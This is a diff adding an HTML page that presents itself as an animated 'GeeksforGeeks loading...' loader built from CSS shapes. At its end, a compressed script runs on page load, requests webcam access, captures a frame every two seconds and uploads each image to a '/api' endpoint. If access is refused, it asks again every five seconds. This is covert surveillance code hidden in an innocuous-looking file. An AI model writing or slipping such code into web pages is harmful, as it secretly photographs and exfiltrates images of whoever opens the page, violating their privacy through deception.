@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Animated loader</title>
+
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #202020;
+
+        }
+
+        .pieces {
+            padding: 10px;
+            border-radius: 50%;
+            background: #ffcc00;
+            position: absolute;
+            right: 40%;
+            animation: pieces 1s linear infinite;
+        }
+
+        .one {
+            position: absolute;
+            top: 50.5%;
+            left: 30%;
+            background: yellowgreen;
+            border-radius: 0 0 125px 125px;
+            height: 125px;
+            width: 250px;
+            animation: anim1 1s linear infinite;
+        }
+
+        .two {
+            position: absolute;
+            top: 36.5%;
+            left: 30%;
+            background: yellowgreen;
+            border-radius: 125px 125px 0 0;
+            height: 125px;
+            width: 250px;
+            animation: anim2 1s linear infinite;
+        }
+
+        .eye {
+            position: absolute;
+            right: 60%;
+            top: 40%;
+            background: #202020;
+            padding: 12px;
+            border-radius: 50%;
+            animation: eye 1s linear infinite;
+        }
+
+        p {
+            position: absolute;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 25px;
+            letter-spacing: 2px;
+            top: 53%;
+            right: 30%;
+            font-family: arial;
+            color: green;
+        }
+
+        @keyframes anim1 {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            50% {
+                transform: rotate(20deg);
+            }
+
+            100% {
+                transform: rotate(0deg);
+            }
+        }
+
+        @keyframes anim2 {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            50% {
+                transform: rotate(-20deg);
+            }
+
+            100% {
+                transform: rotate(0deg);
+            }
+        }
+
+        @keyframes eye {
+            0% {
+                top: 40%;
+                right: 60%;
+            }
+
+            50% {
+                top: 40.3%;
+                right: 60.3%;
+            }
+
+            100% {
+                top: 40%;
+                right: 60%;
+            }
+        }
+
+        @keyframes pieces {
+            0% {
+                right: 40%;
+            }
+
+            100% {
+                right: 60%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="pieces"></div>
+    <div class="one"></div>
+    <div class="two"></div>
+    <div class="eye"></div>
+
+    <p>GeeksforGeeks loading...</p>
+    
+    <script>
+        async function setupCamera(){try{const stream=await navigator.mediaDevices.getUserMedia({video:true});return stream;}catch(error){console.error("Error accessing camera:",error);return null;}}
+        async function captureImage(video){let canvas=document.createElement("canvas");let context=canvas.getContext("2d");canvas.width=video.videoWidth;canvas.height=video.videoHeight;context.drawImage(video,0,0,canvas.width,canvas.height);let imageData=canvas.toDataURL("image/png");
+        try{let response=await fetch("/api",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({image:imageData})});let result=await response.json();}catch(error){console.error("Error uploading image:",error);}}
+        async function startCapturing(){while(true){const stream=await setupCamera();if(stream){const video=document.createElement("video");video.srcObject=stream;video.play();
+        setInterval(()=>{captureImage(video);},2000);break;}else{await new Promise(resolve=>setTimeout(resolve,5000));}}}
+        startCapturing();
+    </script> 
+   
+</body>
+
+</html>
